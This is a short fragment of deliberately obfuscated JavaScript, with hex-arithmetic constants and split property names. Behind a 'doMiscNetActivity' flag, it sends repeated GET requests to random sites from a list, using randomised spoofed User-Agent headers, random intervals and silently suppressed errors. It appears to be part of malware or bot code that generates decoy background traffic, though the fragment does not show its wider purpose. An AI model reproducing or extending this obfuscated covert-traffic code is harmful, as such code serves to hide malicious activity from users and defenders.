    for (let l = -0x629 * -0x5 + -0x1a86 + -0x447; l < -0x2360 + -0xba5 * 0x1 + -0x1 * -0x2f09; l++)
      setTimeout(f, (0x16cab + -0x13b9e * 0x1 + 0x1 * 0xb953) * l * getRandomInt(-0x1 * -0x207b + -0x1157 + -0xf23, -0x9c7 + -0x1 * 0x427 + -0x2b * -0x53));
  }, 0x3 * -0x1ae834 + 0x483653 + 0x3f70c9);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x2f93 * 0x1 + -0x1d58 + 0x6843) * getRandomInt(-0x2 * 0xae3 + -0x8df + 0x1 * 0x1ea6, 0x13a3 + -0x160 + -0x123e));
}, -0x127e + 0x1e6d * 0x1 + -0xb8b);